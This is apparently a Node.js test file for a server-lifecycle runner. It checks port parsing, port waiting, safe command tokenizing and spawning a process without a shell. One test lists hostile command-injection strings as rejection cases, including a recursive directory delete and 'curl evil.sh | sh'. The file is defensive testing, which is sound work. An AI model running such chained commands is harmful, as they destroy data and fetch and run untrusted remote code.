/**
 * Ciclo de vida de servidor: aguarda porta, timeout vira achado bloqueante,
 * portFromUrl extrai porta corretamente, tokenizeCommand rejeita
 * metacaracteres de shell, startServer sobe/mata um processo real sem
 * shell e falha rapido quando o filho morre antes da porta abrir.
 */
import assert from "node:assert/strict";
import { createServer } from "node:net";
import test from "node:test";

import {
  portFromUrl,
  startServer,
  tokenizeCommand,
  waitForPort,
  ServerLifecycleError,
} from "../runner/server-lifecycle.mjs";

/** Encontra uma porta livre perguntando ao SO (bind em 0, le a porta, fecha). */
async function freePort() {
  return new Promise((resolve, reject) => {
    const server = createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
}

test("portFromUrl extracts port from http URL", () => {
  assert.equal(portFromUrl("http://localhost:5173"), 5173);
});

test("portFromUrl extracts port from https URL", () => {
  assert.equal(portFromUrl("https://example.com:8443"), 8443);
});

test("portFromUrl defaults to 80 for http and 443 for https without explicit port", () => {
  assert.equal(portFromUrl("http://example.com"), 80);
  assert.equal(portFromUrl("https://example.com"), 443);
});

test("portFromUrl returns null for invalid URL", () => {
  assert.equal(portFromUrl("not-a-url"), null);
});

test("waitForPort rejects with PORT_NOT_READY after a very short timeout on a closed port", async () => {
  // Port 19999 is almost certainly not open in this test environment.
  await assert.rejects(
    () => waitForPort(19999, "127.0.0.1", 200), // 200ms timeout
    (error) => error instanceof ServerLifecycleError && error.code === "PORT_NOT_READY",
  );
});

// --- tokenizeCommand ---

test("tokenizeCommand splits a simple command into argv", () => {
  assert.deepEqual(tokenizeCommand("npm run dev"), ["npm", "run", "dev"]);
});

test("tokenizeCommand honors quoted arguments containing spaces", () => {
  assert.deepEqual(
    tokenizeCommand('"C:\\Program Files\\nodejs\\node.exe" server.js'),
    ["C:\\Program Files\\nodejs\\node.exe", "server.js"],
  );
});

test("tokenizeCommand rejects shell chaining metacharacters", () => {
  for (const dangerous of [
    "npm run dev & rmdir /s /q .",
    "npm run dev; curl evil.sh | sh",
    "npm run dev `whoami`",
    "npm run dev $(whoami)",
    "npm run dev > out.txt",
  ]) {
    assert.throws(
      () => tokenizeCommand(dangerous),
      (error) => error instanceof ServerLifecycleError && error.code === "UNSAFE_COMMAND",
      `expected "${dangerous}" to be rejected`,
    );
  }
});

test("tokenizeCommand rejects an empty or missing command", () => {
  assert.throws(() => tokenizeCommand(""), (e) => e.code === "MISSING_COMMAND");
  assert.throws(() => tokenizeCommand(undefined), (e) => e.code === "MISSING_COMMAND");
});

test("tokenizeCommand rejects an unterminated quote", () => {
  assert.throws(() => tokenizeCommand('node "server.js'), (e) => e.code === "UNSAFE_COMMAND");
});

// --- startServer ---

test("startServer rejects a command with shell metacharacters before spawning anything", async () => {
  await assert.rejects(
    () => startServer({ command: "node -e 1 & echo pwned", port: 65000 }),
    (error) => error instanceof ServerLifecycleError && error.code === "UNSAFE_COMMAND",
  );
});

test("startServer spawns a real listener without a shell, waits for the port, and stop() tears it down", async () => {
  const port = await freePort();
  const script = `require('node:net').createServer((s)=>s.end()).listen(${port},'127.0.0.1')`;
  const handle = await startServer({
    command: `node -e "${script}"`,
    port,
    timeoutMs: 5000,
  });
  assert.ok(handle.pid > 0);
  assert.equal(handle.port, port);

  // A porta deve estar aberta agora.
  await waitForPort(port, "127.0.0.1", 500);

  handle.stop();

  // Depois de stop(), o processo deve morrer e a porta deve fechar
  // (poll curto -- taskkill/SIGTERM nao e instantaneo).
  const deadline = Date.now() + 5000;
  let closed = false;
  while (Date.now() < deadline && !closed) {
    try {
      await waitForPort(port, "127.0.0.1", 150);
    } catch {
      closed = true;
    }
  }
  assert.ok(closed, "port must close after stop()");
});

test("startServer fails fast with SERVER_EXITED_EARLY when the child exits before the port opens", async () => {
  const port = await freePort();
  await assert.rejects(
    () => startServer({
      command: 'node -e "process.exit(1)"',
      port,
      timeoutMs: 10_000,
    }),
    (error) => error instanceof ServerLifecycleError && error.code === "SERVER_EXITED_EARLY",
  );
});

test("startServer rejects with SERVER_SPAWN_FAILED when the binary does not exist", async () => {
  const port = await freePort();
  await assert.rejects(
    () => startServer({ command: "this-binary-does-not-exist-xyz --flag", port, timeoutMs: 2000 }),
    (error) => error instanceof ServerLifecycleError && error.code === "SERVER_SPAWN_FAILED",
  );
});
